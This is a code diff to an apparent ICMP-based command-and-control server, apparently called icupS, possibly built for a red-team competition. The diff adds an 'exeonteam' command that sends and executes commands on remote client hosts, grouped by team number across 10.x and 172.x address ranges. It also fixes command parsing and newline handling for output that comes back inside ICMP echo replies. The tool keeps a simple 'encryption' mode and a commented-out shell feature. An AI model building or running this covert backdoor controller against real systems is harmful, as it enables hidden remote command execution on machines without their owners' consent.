@@ -10,6 +10,8 @@ DEVDEBUG = False               # Set to display statements specific to debugging
 JSONFILE = "example.json"      # Set to point to configuration files with loadclients
 SuperSecretMode = False         # Enables "encryption"
 KEY = "B"
+CLOUD = "172"
+LAN = "10"
 
 def print_title(): 
     print(".__                          ___             .__.__    ___") 
@@ -129,13 +131,31 @@ def sendtoall(arguments, clients, execute):
 
 def exeonall(arguments, clients, execute):
     global SuperSecretMode
-    if len(arguments)<2 or arguments[1] == "": 
-        print("[ERROR] Usage: sendtoall <message>")
+    if len(arguments)<3 or arguments[1] == "": 
+        print("[ERROR] Usage: exeonall <message>")
     else:
         for client in clients:
             send_over_icmp(clients.get(client), arguments[1], execute)
             if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
             elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
+
+def exeonteam(arguments, clients, execute):
+    global SuperSecretMode
+    if len(arguments)<2: 
+        print("[ERROR] Usage: exeonteam <team> <message>")
+    else:
+        for client in clients:
+            octets = clients.get(client).split('.')
+            if octets[0] == LAN:
+                if str(arguments[1][0]) == str(octets[1]):
+                    send_over_icmp(clients.get(client), arguments[1], execute)
+                    if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
+                    elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
+            if octets[0] == CLOUD:
+                if str(arguments[1][0]) == str(octets[2]):
+                    send_over_icmp(clients.get(client), arguments[1], execute)
+                    if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
+                    elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
 
 # TODO Repair or remove
 # # Place icupS into single client mode
@@ -182,8 +202,14 @@ def listen(pkt):
         command = parsed[1][:-1]
         if command[0] == "$":
             output = encrypt_decrypt(command[1:])
-            print(f"Recieved:\n\t{output} from {src}")
-        else: print(f"Recieved:\n\t{command[0:2]} {command[2:]} from {src}")
+            newlineparsed = output.replace("\\\\n","\n")
+            print(f"Recieved:\n\t{newlineparsed} from {src}")
+
+        else: 
+            newlineparsed = command[2:].replace("\\\\n","\n")
+            print(f"Recieved:\n\t{command[0:2]} {newlineparsed} from {src}")
+
+        
 
 def sniffer():
     sniff(filter="icmp[icmptype] == icmp-echoreply", prn=listen)
@@ -226,15 +252,17 @@ def main():
             send_command(arguments, clients, execute=True)
         elif arguments[0] == "send":
             send_command(arguments, clients, execute=False)
-        elif arguments[0] == "exetoall":
-            sendtoall(arguments, clients, execute=True)
         elif arguments[0] == "sendtoall":
             sendtoall(arguments, clients, execute=False)
-        elif arguments[0] == "exetoall":
+        elif arguments[0] == "exeonall":
             exeonall(arguments, clients, execute=True)
+        elif arguments[0] == "sendtoteam":
+            exeonteam(arguments, clients, execute=False)
+        elif arguments[0] == "exeonteam":
+            exeonteam(arguments, clients, execute=True)
         elif arguments[0] == "loadclients":
             id = generate_targets(JSONFILE, clients, id)
-        # elif arguments[0] == "shell":
+        # elif arguments[0] == "shell":  [DONT WORRY ABOUT IT]
         #     shell(clients, arguments)
         elif arguments[0] == "kill":
             print_title()
